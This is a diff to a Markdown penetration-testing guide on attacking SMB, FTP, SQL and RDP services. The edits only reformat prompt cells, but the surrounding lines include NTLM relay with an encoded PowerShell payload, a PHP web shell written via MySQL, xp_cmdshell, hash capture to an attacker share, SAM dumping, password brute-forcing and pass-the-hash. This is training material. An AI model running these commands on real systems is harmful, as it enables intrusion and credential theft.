@@ -55,7 +55,11 @@ In the Run dialog box, type the file share location in the following format:
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 \\<IP>\<SHARE_NAME>
@@ -83,7 +87,11 @@ The command dir displays a list of a directory's files and subdirectories.
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 dir  \\<IP>\<SHARE_NAME>
@@ -119,7 +127,11 @@ Directory of \\192.168.220.129\Finance
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 net use n: \\<IP>\<SHARE_NAME>
@@ -132,7 +144,11 @@ net use n: \\<IP>\<SHARE_NAME>
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 net use n: \\<IP>\<SHARE_NAME> /user:<USER> <PASSWORD>
@@ -147,7 +163,11 @@ With the shared folder mapped as the `n` drive, we can execute Windows commands 
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 dir n: /a-d /s /b | find /c ":\"
@@ -165,7 +185,11 @@ dir n: /a-d /s /b | find /c ":\"
 
 <table width="100%">
 <tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
-<tr><td width="20%">**`PS C:\>`**</td><td>
+<tr><td width="20%">
+
+**`PS C:\>`**
+
+</td><td>
 
 ```powershell
 Get-ChildItem \\<IP>\<SHARE_NAME>
@@ -196,7 +220,11 @@ d-----         2/23/2022   3:27 PM                Contracts
 
 <table width="100%">
 <tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
-<tr><td width="20%">**`PS C:\>`**</td><td>
+<tr><td width="20%">
+
+**`PS C:\>`**
+
+</td><td>
 
 ```powershell
 New-PSDrive -Name "N" -Root "\\<IP>\<SHARE_NAME>" -PSProvider "FileSystem"
@@ -209,7 +237,11 @@ New-PSDrive -Name "N" -Root "\\<IP>\<SHARE_NAME>" -PSProvider "FileSystem"
 
 <table width="100%">
 <tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
-<tr><td width="20%">**`PS C:\>`**</td><td>
+<tr><td width="20%">
+
+**`PS C:\>`**
+
+</td><td>
 
 ```powershell
 $username = '<USER>'
@@ -237,7 +269,11 @@ N                                      FileSystem    \\192.168.220.129\Finance
 
 <table width="100%">
 <tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
-<tr><td width="20%">**`PS C:\>`**</td><td>
+<tr><td width="20%">
+
+**`PS C:\>`**
+
+</td><td>
 
 ```powershell
 N:
@@ -265,7 +301,11 @@ Linux (UNIX) machines can also browse and mount SMB shares. This works whether t
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo mkdir /mnt/<SHARE_NAME>
@@ -279,7 +319,11 @@ sudo mount -t cifs -o username=<USER>,password=<PASWORD>,domain=. \\<IP>\<SHARE_
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo mkdir /mnt/<SHARE_NAME>
@@ -325,7 +369,11 @@ The `sqlcmd` utility lets you enter Transact-SQL statements, system procedures, 
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sqsh -S <IP> -U <USER> -P <PASSWORD>
@@ -341,7 +389,11 @@ sqsh -S <IP> -U <USER> -P <PASSWORD>
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sqlcmd -S <IP> -U <USER> -P <PASSWORD>
@@ -359,7 +411,11 @@ sqlcmd -S <IP> -U <USER> -P <PASSWORD>
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 mysql -u <USER> -p<PASSWORD> -h <IP>
@@ -377,7 +433,11 @@ mysql -u <USER> -p<PASSWORD> -h <IP>
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 mysql.exe -u <USER> -p<PASSWORD> -h <IP>
@@ -718,7 +778,11 @@ Once access is gained, you should:
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap -sC -sV -p 21 <TARGET_IP>
@@ -765,7 +829,11 @@ If read/write permissions are **not** configured correctly:
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 ftp <TARGET_IP> <PORT>
@@ -806,7 +874,11 @@ ftp> ls
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 medusa -u <USER_LIST> -P <PASSWORD_LIST> -h <TARGET_IP> -M ftp -n <PORT>
@@ -850,7 +922,11 @@ This is achieved by manipulating the `PORT` command to make the FTP server conne
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 nmap -Pn -v -n -p80 -b <USER>:<PASSWORD>@<ATTACKER_IP> <TARGET_IP>
@@ -928,7 +1004,11 @@ When scanning, SMB on **port 445** indicates direct TCP usage, while **port 139*
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap <TARGET_IP> -sV -sC -p139,445
@@ -1006,7 +1086,11 @@ SMB servers can allow access without requiring a username and password (null ses
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smbclient -N -L //<TARGET_IP>
@@ -1036,7 +1120,11 @@ SMB1 disabled no workgroup available
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smbmap -H <TARGET_IP>
@@ -1064,7 +1152,11 @@ notes      READ, WRITE   CheckIT
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smbmap -H <TARGET_IP> -r <SHARE_NAME>
@@ -1100,7 +1192,11 @@ From the above example, the permissions are set to READ and WRITE, which one can
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smbmap -H <TARGET_IP> --download "notes\note.txt"
@@ -1123,7 +1219,11 @@ smbmap -H <TARGET_IP> --download "notes\note.txt"
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smbmap -H <TARGET_IP> --upload ./test.txt "notes\test.txt"
@@ -1153,7 +1253,11 @@ RPC can be enumerated using a **null session** with `rpcclient` or automated too
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 rpcclient -U'%' <TARGET_IP>
@@ -1183,7 +1287,11 @@ user:[smorgan] rid:[0xa37]
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 ./enum4linux-ng.py <TARGET_IP> -A -C
@@ -1258,7 +1366,11 @@ If a null session is not enabled, we will need credentials to interact with the 
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER_LIST> -p '<PASSWORD>' --local-auth
@@ -1297,7 +1409,11 @@ To use impacket-psexec, we need to provide the domain/username, the password, an
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 impacket-psexec <USER>:'<PASSWORD>'@<TARGET_IP>
@@ -1336,7 +1452,11 @@ C:\Windows\system32>
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
@@ -1370,7 +1490,11 @@ Imagine we are in a network with multiple machines. Some of them share the same 
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 crackmapexec smb 10.10.110.0/24 -u <USER> -p '<PASSWORD>' --local-auth --logged-on-users
@@ -1411,7 +1535,11 @@ The Security Account Manager (SAM) is a database file that stores users' passwor
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam
@@ -1449,7 +1577,11 @@ If we manage to get an **NTLM hash** of a user, and if we cannot crack it, we ca
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
@@ -1577,7 +1709,11 @@ flowchart TD
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo responder -I ens3
@@ -1642,7 +1778,11 @@ All saved Hashes are located in Responder's logs directory (**`/usr/share/respon
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
@@ -1681,7 +1821,11 @@ If the hash cannot be cracked, it may still be leveraged through a relay attack.
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
@@ -1694,7 +1838,11 @@ sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat /etc/responder/Responder.conf | grep 'SMB ='
@@ -1721,7 +1869,11 @@ Set the local IP, port, and generate the encoded command.
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 nc -lvnp <PORT>
@@ -1743,7 +1895,11 @@ listening on [any] 9001 ...
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <BASE64_STRING>'
@@ -1818,7 +1974,11 @@ Database services are frequently configured with highly privileged users. If an 
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap <TARGET_IP> -Pn -sV -sC -p1433
@@ -1965,7 +2125,11 @@ This targeted approach will not only save time, but also help you find data that
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 mysql -u <USER> -p<PASSWORD> -h <TARGET_IP>
@@ -1983,7 +2147,11 @@ mysql -u <USER> -p<PASSWORD> -h <TARGET_IP>
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`mysql>`**</td><td>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
 
 ```sql
 SHOW DATABASES;
@@ -2011,7 +2179,11 @@ SHOW DATABASES;
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`mysql>`**</td><td>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
 
 ```sql
 USE users;
@@ -2033,7 +2205,11 @@ Database changed
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`mysql>`**</td><td>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
 
 ```sql
 SHOW TABLES;
@@ -2067,7 +2243,11 @@ SHOW TABLES;
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`mysql>`**</td><td>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
 
 ```sql
 SELECT * FROM users;
@@ -2108,7 +2288,11 @@ For example, if **MySQL** is running alongside a PHP-based web server (or anothe
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`mysql>`**</td><td>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
 
 ```sql
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
@@ -2131,7 +2315,11 @@ In MySQL, the global system variable `secure_file_priv` restricts data import an
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`mysql>`**</td><td>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
 
 ```sql
 show variables like "secure_file_priv";
@@ -2165,7 +2353,11 @@ By default a MySQL installation does not allow arbitrary file read, but if the c
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`mysql>`**</td><td>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
 
 ```sql
 select LOAD_FILE("/etc/passwd");
@@ -2214,7 +2406,11 @@ sync:x:4:65534:sync:/bin:/bin/sync
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sqsh -S <TARGET_IP> -U <USER> -P '<PASSWORD>' -h
@@ -2234,7 +2430,11 @@ If no hostname or domain is provided, the client defaults to **SQL authenticatio
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sqsh -S <TARGET_IP> -U .\\<USER> -P '<PASSWORD>' -h
@@ -2247,7 +2447,11 @@ sqsh -S <TARGET_IP> -U .\\<USER> -P '<PASSWORD>' -h
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 python3 /usr/local/bin/mssqlclient.py -p <PORT> <USER>@<TARGET_IP>
@@ -2265,7 +2469,11 @@ python3 /usr/local/bin/mssqlclient.py -p <PORT> <USER>@<TARGET_IP>
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT name FROM master.dbo.sysdatabases;
@@ -2292,7 +2500,11 @@ users
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT name FROM sys.databases WHERE HAS_DBACCESS(name)=1 ORDER BY name;
@@ -2305,7 +2517,11 @@ SELECT name FROM sys.databases WHERE HAS_DBACCESS(name)=1 ORDER BY name;
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 USE users;
@@ -2328,7 +2544,11 @@ Changed database context to 'users'.
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT table_name FROM users.INFORMATION_SCHEMA.TABLES;
@@ -2358,7 +2578,11 @@ users
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT * FROM users;
@@ -2393,7 +2617,11 @@ Command execution is one of the most valuable capabilities when attacking common
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 xp_cmdshell 'whoami'
@@ -2422,7 +2650,11 @@ If `xp_cmdshell` is not enabled, we can enable it.
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 EXECUTE sp_configure 'show advanced options', 1
@@ -2436,7 +2668,11 @@ GO
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 RECONFIGURE
@@ -2450,7 +2686,11 @@ GO
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 EXECUTE sp_configure 'xp_cmdshell', 1
@@ -2464,7 +2704,11 @@ GO
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 RECONFIGURE
@@ -2482,7 +2726,11 @@ To write files using MSSQL, we need to enable Ole Automation Procedures, which r
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 sp_configure 'show advanced options', 1
@@ -2502,7 +2750,11 @@ GO
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 DECLARE @OLE INT
@@ -2526,7 +2778,11 @@ By default, MSSQL allows file read on any file in the operating system to which 
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
@@ -2566,7 +2822,11 @@ We can capture the MSSQL service account hash by abusing the undocumented stored
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
@@ -2590,7 +2850,11 @@ GO
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
@@ -2616,7 +2880,11 @@ If the service account has access to our server, we will obtain its hash. We can
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo responder -I tun0
@@ -2649,7 +2917,11 @@ sudo responder -I tun0
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo impacket-smbserver share ./ -smb2support
@@ -2690,7 +2962,11 @@ SQL Server has a special permission, named **IMPERSONATE**, that allows the exec
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT distinct b.name
@@ -2723,7 +2999,11 @@ GO
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT SYSTEM_USER
@@ -2757,7 +3037,11 @@ As the returned value 0 indicates, we do not have the sysadmin role, but we can 
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 EXECUTE AS LOGIN = 'sa'
@@ -2805,7 +3089,11 @@ From a security perspective, access to a SQL Server with one or more linked serv
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 SELECT srvname, isremote FROM sysservers
@@ -2840,7 +3128,11 @@ The query returns each server’s name and the `isremote` flag. In this context,
 
 <table width="100%">
 <tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
-<tr><td width="20%">**`1>`**</td><td>
+<tr><td width="20%">
+
+**`1>`**
+
+</td><td>
 
 ```sql
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
@@ -2909,7 +3201,11 @@ If an attacker gains access to an RDP port, they may be able to:
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap -Pn -p3389 <TARGET_IP>
@@ -2954,7 +3250,11 @@ Since RDP relies on user credentials for authentication, a common attack vector 
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat usernames.txt
@@ -2983,7 +3283,11 @@ cat usernames.txt
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
@@ -3009,7 +3313,11 @@ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
@@ -3037,7 +3345,11 @@ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 rdesktop -u administrator -p password123 192.168.2.143
@@ -3059,7 +3371,11 @@ This attack requires **Restricted Admin Mode**, which is disabled by default on 
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
@@ -3076,7 +3392,11 @@ HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
@@ -3089,7 +3409,11 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<HASH>
